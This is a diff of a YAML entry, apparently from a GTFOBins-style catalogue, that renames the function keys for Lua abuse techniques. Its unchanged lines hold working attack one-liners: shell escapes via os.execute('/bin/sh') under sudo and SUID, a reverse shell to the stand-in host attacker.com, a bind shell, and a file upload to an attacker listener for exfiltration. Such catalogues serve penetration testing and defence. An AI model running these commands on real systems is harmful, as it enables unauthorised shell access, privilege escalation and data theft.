@@ -1,8 +1,8 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: lua -e 'os.execute("/bin/sh")'
-  reverse-shell-non-interactive:
+  non-interactive-reverse-shell:
     - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.
       code: |
         export RHOST=attacker.com
@@ -15,7 +15,7 @@ functions:
             local b=assert(f:read("*a"));t:send(b);
           end;
           f:close();t:close();'
-  bind-shell-non-interactive:
+  non-interactive-bind-shell:
     - description: Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.
       code: |
         export LPORT=12345
@@ -26,7 +26,7 @@ functions:
             local r,x=c:receive();local f=assert(io.popen(r,"r"));
             local b=assert(f:read("*a"));c:send(b);
           end;c:close();f:close();'
-  upload:
+  file-upload:
     - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.
       code: |
         RHOST=attacker.com
@@ -41,7 +41,7 @@ functions:
           t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
           t:send(d);
           t:close();'
-  download:
+  file-download:
     - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345
         < "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.
       code: |
@@ -59,8 +59,8 @@ functions:
     - code: lua -e 'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);'
   file-read:
     - code: lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
-  sudo-enabled:
+  sudo:
     - code: sudo lua -e 'os.execute("/bin/sh")'
-  suid-limited:
+  limited-suid:
     - code: ./lua -e 'os.execute("/bin/sh")'
 ---
